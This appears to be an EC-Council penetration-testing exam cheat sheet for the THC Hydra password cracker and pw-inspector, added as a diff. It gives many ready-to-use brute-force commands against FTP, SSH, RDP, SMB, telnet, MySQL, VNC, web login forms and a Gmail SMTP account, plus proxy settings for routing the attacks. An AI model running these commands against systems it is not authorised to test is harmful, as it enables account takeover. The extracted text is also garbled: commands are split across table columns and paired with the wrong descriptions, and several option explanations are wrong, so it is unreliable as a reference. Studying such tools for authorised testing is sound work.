@@ -1,0 +1,313 @@
+Certified Penetration Testing Professional Exam 412-80
+THC Hydra Cheat Sheet
+Certified Penetration Testing Professional
+THC Hydra Cheat Sheet
+Hydra Package Description
+Source: https://github.com
+Hydra is a parallelized login and password cracker tool which supports several protocols and
+databases. It is a very fast and flexible tool. This tool helps the researchers and security
+consultants to analyses how easy it would be to gain unauthorized remote access to any system
+Tools included in the hydra package
+hydra – Very fast network logon cracker
+Syntax
+hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr]
+[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f]
+[-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m
+MODULE_OPT] [service://server[:PORT][/OPT]]
+Arguments/ Options
+-R Restores a previous aborted/crashed session
+-I Ignore an existing restore file
+-S Performs an SSL connect
+If the service is on a different default port,
+-s PORT
+define it here
+Log in with a single username, or load
+-l LOGIN or -L FILE
+several logins from FILE of username list
+-p PASS or -P FILE Try single password, or load several
+Page | 1 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+THC Hydra Cheat Sheet
+passwords from FILE of the password list
+Password brute force generation, type "-x -
+-x MIN:MAX:CHARSET
+h" to get help
+Try "n" null password, "s" login as pass
+-e nsr
+and/or "r" reversed login
+Loop around users, not passwords (effective!
+-u
+implied with -x)
+Colon separated "login:pass" format, instead
+-C FILE
+of -L/-P options
+List of servers to be attacked in parallel, one
+-M FILE
+entry per line
+Write found login/password pairs to FILE
+-o FILE
+instead of stdout
+Exit when a login/pass pair is found (-M: -f
+-f / -F
+per host, -F global)/ stop on the correct login
+Run TASKS number of connects in parallel
+-t TASKS (per host, default: 16)/ limit concurrent
+connections
+Wait time for responses (32s) / between
+-w / -W TIME
+connects per thread
+-c TIME Wait time per login attempt over all threads
+-4 / -6 Prefer IPv4 (default) or IPv6 addresses
+Verbose output (mode) / show login+pass for
+-v / -V / -d
+each attempt / debug mode
+-U Service module usage details
+server The target server
+service The service to crack
+Some service modules support additional
+OPT
+input (-U for module help)
+Page | 2 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+THC Hydra Cheat Sheet
+THC Hydra
+Commands Description
+hydra -V -l admin -P
+Attack the router along with its arguments
+/root/Desktop/dictionary.txt
+hydra -V -l admin -P
+Null password and to use login credentials
+/root/Desktop/dictionary.txt -e
+as password
+ns -f -s 21 <Target IP> ftp
+hydra -l <username> -P pass.txt
+Password Guessing for Specific Username
+<Target IP> ftp
+hydra -L user.txt -p <password>
+Username Guessing for Specific Password
+<Target IP> ftp
+hydra -L user.txt -P pass.txt
+Cracking Login Credential
+<Target IP> ftp
+hydra -L user.txt -P pass.txt
+NULL/Same as Login/Reverse login Attempt
+<Target IP> ftp -V -e nsr
+hydra -L user.txt -P pass.txt
+Save Output to Disk
+<Target IP> ftp -o result.txt
+hydra -L user.txt -P pass.txt
+Resuming the Brute Force Attack
+<Target IP> ftp
+hydra -l <username> -x
+MIN:MAX:CHARSET ftp://<Target IP>
+Password Generating Using Various Set of
+or
+Character
+hydra -l <username> -x
+MIN:MAX:CHARSET <Target IP> ftp
+hydra -l <username> -x
+Find the password for a username for FTP
+MIN:MAX:CHARSET ftp://<Target IP>
+login
+-V
+hydra -L user.txt -P pass.txt
+Attacking on Specific Port Instead of Default
+<Target IP> ftp -s <port>
+hydra -L user.txt -P pass.txt -M Brute force attack on multiple hosts by using
+hosts.txt ftp the same dictionary
+Enables to finish parameter when found
+hydra -L user.txt -P pass.txt -M
+valid credential for either host from inside
+hosts.txt ftp -V -F
+the host list
+hydra -t 4 -V -f -l <username> -P Using Remote Desktop Protocol to pull
+textname.txt rdp://<Target IP> passwords from the text file
+hydra -P passwordlist -t 1 -w 5 - Turned off the blacklisting feature run this
+f -s 5901 <Target IP> vnc -v command in hydra
+Page | 3 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+THC Hydra Cheat Sheet
+hydra -l root -p admin <Target
+Test the root user's SSH password
+IP> -t 4 ssh
+hydra -l root -P
+/usr/share/wordlists/rockyou.txt Using Word Lists
+<Target IP> -t 4 ssh
+hydra -l root -P
+Documents/pass.txt <Target IP> -t Words in that list
+4 ssh
+hydra -L
+/usr/share/wordlists.rockyou.txt Hydra accepts wordlists for users and
+-P targets. They can be specified with the -L
+/usr/share/wordlists/rockyou.txt
+flag for users, and the -M flag for IPs
+-M Documents/ip.txt -t 4 ssh
+hydra <Target IP> ssh -l
+Brute-force ssh username input login and list
+<username> -P <password_file> -s
+of password
+22 -vV
+hydra <Target IP> ssh -l
+<username> -p <password> -s 22 - Brute-force ssh username and password
+vV
+hydra -L <username_file> -P Brute-force FTP list of username and list of
+<password_file> ftp://<Target_IP> password
+hydra -l <username> -p <password> Brute-force FTP input login and a single
+ftp://<Target_IP> password
+hydra -l <username> -p <password>
+Brute-force telnet username and password
+telnet://<Target_IP>
+hydra -L <USER> -P <Password> <IP
+Address> http-post-form “<Login Brute force the user information from the
+Page>:<Request Body>:<Error website
+Message>”
+hydra -t 1 -l admin -P
+Use this to brute force an FTP server to try
+/root/Desktop/password.lst -vV
+to crack its password
+192.168.1.1 ftp
+hydra -l user1 -P wordlist.txt Get the password for one of the users
+smb://<Target_IP> configured on the SMB service
+hydra -l <smtp.gmail.com.server>
+-P /root/Desktop/wordlist.txt -S Crack the password of an email account
+<port> smtp.gmail.com smtp
+hydra -l John Doe -x Shortest
+length: longest length: Brute force option is invoked in hydra
+combinations host
+Page | 4 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+THC Hydra Cheat Sheet
+hydra <HOSTNAME>
+<PROTOCOL/METHOD> -m
+"</PATH/TO/AUTH/FILE>:<USERNAME_F
+IELD>=^USER^&<PASSWORD_FIELD>=^PA
+Brute-forcing with hydra (CLI)
+SS^:<ERROR_MESSAGE>" -L
+listOfUsers.txt -P
+listOfPasswords.txt -t 10 -w 30 -
+o <OUTPUT_FILENAME>
+hydra-wizard For CLI-wizard
+xhydra For GUI
+hydra For CLI
+hydra.restore Restore Aborted Session
+hydra -R Resume parameter
+hydra -l plague -P passList.txt -
+vV -f -t 5 192.168.1.100 http-
+Password cracking through HTTP-POST-
+post-form
+FORM
+"/wp/Forum/login.php:log=^USER^&p
+wd=^PASS^:login_error"
+hydra -s 21 -V -l plague -P
+wordlist.txt -e s -t 10 -w 5 Password cracking through FTP
+192.168.1.100 ftp
+hydra -s 22 -V -l plague -P
+wordlist.txt -t 10 -f Password cracking through SSH
+192.168.1.100 ssh
+hydra -s 23 -V -l plague -P
+wordlist.txt -e ns -t 10 -w 5 -f Password cracking through Telnet
+-m 192.168.1.100 telnet
+hydra 192.168.1.1 http-get -v -V
+Password cracking through HTTP Login. For
+-l telekom -P wordlist.txt -e ns
+HTTPS set “https-get”
+-t 5 -w 30 -m / -f
+hydra -t 4 -V -l plague -P
+Password cracking through RDP
+wordlist.txt rdp://192.168.1.100
+hydra -t 4 -V -f -l plague -e ns
+-P wordlist.txt 192.168.1.100 Password cracking through MySQL
+mysql
+Scan/Crack Over a Proxy, the environment
+HYDRA_PROXY_HTTP="http://<Target
+variable HYDRA_PROXY_HTTP defines the
+IP>:<port>/"
+web proxy
+Page | 5 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+THC Hydra Cheat Sheet
+HYDRA_PROXY_HTTP="http://login:pa
+HYDRA_PROXY_HTTP defines the Web Proxy
+ssword@123. <Target IP>:<port>/"
+HYDRA_PROXY=[connect|socks4|socks
+Use the HYDRA_PROXY variable to
+5]://[login:password@]proxy_addr:
+scan/crack for all other services
+proxy_port
+Pw-inspector- A tool to reduce the password list
+Syntax
+pw-inspector [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c
+MINSETS] -l -u -n -p -s
+Arguments/ Options
+-i FILE File to read passwords from (default: stdin)
+File to write valid passwords to (default:
+-o FILE
+stdout)
+-m MINLEN Minimum length of a valid password
+-M MAXLEN Maximum length of a valid password
+The minimum number of sets required
+-c MINSETS
+(default: all given)
+-h, --help Show summary of options
+Sets
+-l Lowcase characters (a,b,c,d, etc.)
+-u Upcase characters (A,B,C,D, etc.)
+-n Upcase characters (A,B,C,D, etc.)
+Printable characters (which are not -l/-n/-p,
+-p
+e.g. $,!,/,(,*, etc.)
+Special characters - all others not within the
+-s
+sets above
+Page | 6 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+THC Hydra Cheat Sheet
+Commands Description
+Read in a list of passwords (-i
+pw-inspector -i /usr/share/wordlists/nmap.lst) and save to a
+/usr/share/wordlists/nmap.lst -o file (-o /root/passes.txt), selecting
+/root/passes.txt -m 6 -M 10
+passwords of a minimum length of 6 (-m 6)
+and a maximum length of 10 (-M 10)
+pw-inspector -h Access to pw-inspector parameters
+cat attack_hydra.txt | pw-
+inspector -m <passwordlength> -n Start the attack with Hydra command
+> passwords.txt
+cat first.txt | pw-inspector -m 6 Remove lines in a text file that are way too
+-M 128 > newfile.txt long and are less than a certain length
+pw-inspector -i
+/path/to/input.list -o Use the rockyou.txt file available from Kali
+/path/to/output -m minchar -M Linux
+maxchar
+cat list.txt | pw-inspector -m 5
+Get some passwords with 4 characters
+> new_list.txt
+Read the passwords from the rockyou.txt
+file (cat rockyou.txt) into the standard
+output, sort them (sort), and delete the
+cat rockyou.txt | sort | uniq |
+duplicate ones (uniq), from the remaining
+pw-inspector -m 8 -M 63 >
+passwords we select those that are 8 or
+newrockyou.txt
+more characters, but less than 63 characters
+(-m 8 -M 63), the resulting list is saved in the
+file newrockyou.txt (> newrockyou.txt)
+Show passwords that have unprintable
+pw-inspector -i characters (-s) from a dictionary located on
+wordlists/rockyou.txt -s the path wordlists / rockyou.txt (-i wordlists
+/ rockyou.txt)
+Show passwords with at least one capital
+pw-inspector -i letter, one small letter, one number and one
+wordlists/rockyou.txt -c 4 -l -u printed character (-c 4 -l -u -n -p) from the
+-n -p
+dictionary located on the path wordlists /
+rockyou.txt (-i wordlists / rockyou .txt)
+Page | 7 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
